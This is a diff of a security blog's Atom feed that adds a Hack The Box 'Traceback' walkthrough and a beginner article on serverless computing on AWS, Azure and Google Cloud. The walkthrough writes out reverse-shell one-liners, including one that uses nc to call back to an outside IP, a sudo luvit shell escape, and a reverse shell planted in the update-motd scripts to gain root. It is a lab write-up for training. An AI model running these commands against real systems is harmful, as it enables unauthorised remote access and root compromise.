@@ -1,4 +1,246 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-06T06:28:19+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">InfoSec Prep OSCP - Vuln Hub Machine</title><link href="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html" rel="alternate" type="text/html" title="InfoSec Prep OSCP - Vuln Hub Machine" /><published>2020-08-05T00:00:00+05:30</published><updated>2020-08-05T00:00:00+05:30</updated><id>http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP</id><content type="html" xml:base="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html">&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-17T02:29:43+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">Traceback Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/traceback.html" rel="alternate" type="text/html" title="Traceback Machine Walkthrough" /><published>2020-08-15T00:00:00+05:30</published><updated>2020-08-15T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/traceback</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/traceback.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.”&lt;/em&gt;&lt;/strong&gt; - Chanda Kochhar&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
+&lt;p&gt;Box is a linux machine that has a webserver running which is backdoored with a webshell. Upon getting the shell with webadmin access, privilege escalation to sysadmin can be done with misconfigured permissions of executing &lt;strong&gt;luvit&lt;/strong&gt; i.e luvit can be executed as sysadmin without the password. On a successfull login onto the ssh, /etc/update-motd.d/ gets executed with root privilege, rewritting a file in it with reverse shell would grant us the root privilege.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
+&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.181
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The box had two ports open
+| Port         | Service           |
+|:————-|:——————|
+| 22           | SSH               |
+| 80           | Apache            |&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
+&lt;p&gt;I started to enumerate on the webserver, it said “This site has been owned I have left a backdoor for all the net. FREE INTERNETZZZ -Xh4H- “&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viewing the source of the page gave me a hint about the web shells, so i went on to search about Xh4H related to webshells on google&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-initial-foothold-webadmin&quot;&gt;Acquiring Initial Foothold (Webadmin)&lt;/h2&gt;
+&lt;p&gt;I found the web-shells repository of Xh4H, i tried putting all the web-shells in the repository on the url (http://10.10.10.181)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At last, found that smevk.php is the web-shell that has been backdoored on the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webshell has username and password as “admin” that i found on viewing the source of the webshell smevk.php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To grant me the full fleged shell, i decided to upload a bash script that could grant me a proper shell&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-user-shell-sysadmin&quot;&gt;Acquiring User Shell (Sysadmin)&lt;/h2&gt;
+&lt;p&gt;I have the shell as webadmin, now i need to enumerate and esaclate my privileges to a user. Upon enumeration, i found that no password is required to execute /home sysadmin/luvit using the command&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon googling some time, i made a command that can grant me a shell as sysadmin&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sysadmin /home/sysadmin/luvit &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'os.execute(&quot;/bin/sh&quot;)'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got the user, moving on to the getting the root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i started to enumerate on the privileges of sysadmin that can be the way for root privilege escalation. Manual enumeration didnt work it out for me, so i ran linpeas but that also didnt work out. So i decided to monitor the processes that are running using pspy. I added my ssh public key in the on sysadmin/.ssh authorized_keys and transfered the pspy64 to the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-root-shell&quot;&gt;Acquiring Root Shell&lt;/h2&gt;
+&lt;p&gt;I found that /etc/update-motd.d/ gets modified and executed each time when a user logs in through ssh&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also confirmed that /etc/update-motd.d/ has files that are writable by the user sysadmin&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find /etc &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I enumerated on the directory it had 4 files&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/update-motd.d/10-help-text
+/etc/update-motd.d/91-release-upgrade
+/etc/update-motd.d/00-header
+/etc/update-motd.d/80-esm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I decided to have a bash script on /etc/update-motd.d/00-header so i added rev-shell using the command&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/{PORT} 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/update-motd.d/00-header 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now i logged on to ssh in a new tab with a listener on other tab hopping to get reverse connection but that didnt worked out. Upon researching i found that the modification that we made to the file isn’t properly getting safed.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/m;mkfifo /tmp/m;cat /tmp/m|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.158 9090 &amp;gt; /tmp/m&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/update-motd.d/00-header
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I got the reverse shell with root privileges&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/pwned.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.” - Chanda Kochhar</summary></entry><entry><title type="html">Serverless Computing in a Nutshell</title><link href="http://localhost:4000/blogs/cloudsecurity/serverless.html" rel="alternate" type="text/html" title="Serverless Computing in a Nutshell" /><published>2020-08-10T00:00:00+05:30</published><updated>2020-08-10T00:00:00+05:30</updated><id>http://localhost:4000/blogs/cloudsecurity/serverlesscomputing</id><content type="html" xml:base="http://localhost:4000/blogs/cloudsecurity/serverless.html">&lt;p class=&quot;lead&quot;&gt;Most of the Serverless architecture are built with a motto of &lt;strong&gt;&lt;em&gt;“Focus on the application, not the infrastructure and maintenance”&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#what-is-serverless-&quot; id=&quot;markdown-toc-what-is-serverless-&quot;&gt;What is serverless ?&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#popular-serverless-computing-providers&quot; id=&quot;markdown-toc-popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#how-does-serverless-computing-works&quot; id=&quot;markdown-toc-how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#things-serverless-computing-can-handle&quot; id=&quot;markdown-toc-things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#sample-use-case-scenario-of-serverless-computing&quot; id=&quot;markdown-toc-sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#benefits-of-serverless-computing&quot; id=&quot;markdown-toc-benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-aws-lambda&quot; id=&quot;markdown-toc-serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-azure-functions&quot; id=&quot;markdown-toc-serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-google-cloud-functions&quot; id=&quot;markdown-toc-serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#comparison&quot; id=&quot;markdown-toc-comparison&quot;&gt;Comparison&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#security-risks-in-serverless-computing&quot; id=&quot;markdown-toc-security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;what-is-serverless-&quot;&gt;What is serverless ?&lt;/h2&gt;
+&lt;p&gt;Serverless is a cloud computing execution model where the cloud provider dynamically manages the allocation and provisioning of servers (Load balancing). A serverless application runs in stateless compute containers that are event-triggered and its completely managed by the cloud provider itself.&lt;/p&gt;
+
+&lt;h3 id=&quot;popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;AWS lambda&lt;/li&gt;
+  &lt;li&gt;Azure functions&lt;/li&gt;
+  &lt;li&gt;Google Cloud functions&lt;/li&gt;
+  &lt;li&gt;IBM OpenWhisk&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/h3&gt;
+&lt;p&gt;In a micro service architecture, monolithic applications are broken down into smaller services (F1,F2,F3) so you can develop, manage and scale them independently and FaaS (Function as a service) takes that step further by breaking applications to the level of functions and events.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Business person just need to write the business logic as code ( F1,F2,F3), it is loaded into the container for execution when request from the client triggers a particular function. After the execution in the container ,response is generated and delivered back to the client.&lt;/p&gt;
+
+&lt;h3 id=&quot;things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Load Balancing&lt;/li&gt;
+  &lt;li&gt;Auto scaling&lt;/li&gt;
+  &lt;li&gt;Handling Failures&lt;/li&gt;
+  &lt;li&gt;Security Isolation&lt;/li&gt;
+  &lt;li&gt;OS Management&lt;/li&gt;
+  &lt;li&gt;Managing utilization&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/h2&gt;
+&lt;p&gt;When an image is uploaded into a Cloud Storage Service (such as S3), a Serverless function could automatically resize the image for mobile, tablet, desktop devices. The event that triggers the function is the file that has been uploaded to cloud storage. Serverless function then executes the function of resizing the image.&lt;/p&gt;
+
+&lt;h2 id=&quot;benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Pay only when you use:&lt;/strong&gt;The user will be charged against the time that your functions were running (Paid according to no. of request received and Compute time) . Such architectures remove the need for the traditional ‘always on’ server system sitting behind an application, significantly reducing operational cost and complexity.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Easier Operational Management and Automatic Scaling:&lt;/strong&gt;Automatic scaling functionality of FaaS not only reduces computational cost but also reduces operational management overheads.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Serverless Framework module:&lt;/strong&gt;The Serverless Framework consists of an open source CLI that makes it easy to develop, deploy and test serverless apps across different cloud providers, secure and monitor your serverless apps. This can be installed using the below command:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/h2&gt;
+&lt;p class=&quot;lead&quot;&gt;Follow the below steps to deploy a simple serverless service using AWS Lambda&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Configure your CLI with the below command:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless config credentials - provider aws - key &lt;span class=&quot;s2&quot;&gt;&quot;YOUR ACCOUNT KEY&quot;&lt;/span&gt; - secret &lt;span class=&quot;s2&quot;&gt;&quot; YOUR SECRET KEY&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create a project folder for serverless computing with needed template.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; aws-nodejs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;It creates two files : &lt;strong&gt;handler.js&lt;/strong&gt; and &lt;strong&gt;serverless.yml&lt;/strong&gt;. &lt;strong&gt;serverless.yml&lt;/strong&gt; is like a configuration file for your handler file, &lt;strong&gt;handler.js&lt;/strong&gt; is like a function file where each function that are required are coded.&lt;/li&gt;
+  &lt;li&gt;Uncomment the needed event part in the serverless.yml .Here i am using the http event part
+&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/3.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Run the command serverless deploy to deploy your instance.
+&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/h2&gt;
+&lt;p class=&quot;lead&quot;&gt;Microsoft Azure allows the users to develop and run the serverless functions both on Cloud and Local environment. 
+Follow the below steps to deploy a simple serverless service using Azure Functions&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Run the following command from the command line to create a function app project. A github repository is also created with the same name.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func init &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Select a worker runtime from the following language choices that will be prompted after creating the project:
+    &lt;ul&gt;
+      &lt;li&gt;.NET&lt;/li&gt;
+      &lt;li&gt;Node JS&lt;/li&gt;
+      &lt;li&gt;Powershell&lt;/li&gt;
+      &lt;li&gt;Python&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Navigate to the created project folder.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create an HTTP-triggered function using the following command:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func new &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Function_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HttpTrigger&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The following command starts the function app:
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Navigate to URL displayed, append the query string &lt;em&gt;?name={yourname}&lt;/em&gt; to the URL and execute the request.
+&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/h2&gt;
+&lt;p&gt;Follow the below steps to deploy a simple serverless service using Google Cloud Functions&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Install serverless on your machine if not installed.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create a project folder for serverless computing with needed template.
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; google-nodejs &lt;span class=&quot;nt&quot;&gt;--path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;It creates three files: &lt;strong&gt;index.js&lt;/strong&gt;, &lt;strong&gt;package.json&lt;/strong&gt;, &lt;strong&gt;serverless.yml&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Install all the dependencies
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Create the credential key for your project on Google Cloud Console, download the key and update the key path on serverless.yml&lt;/li&gt;
+  &lt;li&gt;Deploy the Serverless Instance
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless deploy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;comparison&quot;&gt;Comparison&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/cloudsecurity/serverlesscomputing/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Function Event-Data Injection&lt;/strong&gt;: Serverless functions can consume input form different types of event sources. Various parts of these event sources may contain user-controlled or untrusted inputs that should be carefully inspected.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Broken Authentication&lt;/strong&gt;: Applications may contain dozens or even hundreds of functions. Applying robust authentication can easily go awry if not executed carefully.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Serverless Business Logic Manipulation&lt;/strong&gt;: Serverless applications are unique as they often follow the micro-services design and contain numerous functions chained together to form overall logic. Without proper enforcement, attackers may be able to tamper with intended logic.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Insecure Application  Secrets Storage&lt;/strong&gt;: In Serverless application secrets such as Credentials, API Key etc. may be stored in a plain text configuration file that may be accessible to the end user and in some cases these credentials will be in plain text, as environment variables.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Improper Exception Handling and Verbose Error Messages&lt;/strong&gt;: Serverless computing provides line-by-line debugging options for applications. As a result, developers frequently adopt the use of verbose error messages, which may leak sensitive data.&lt;/li&gt;
+&lt;/ol&gt;
+
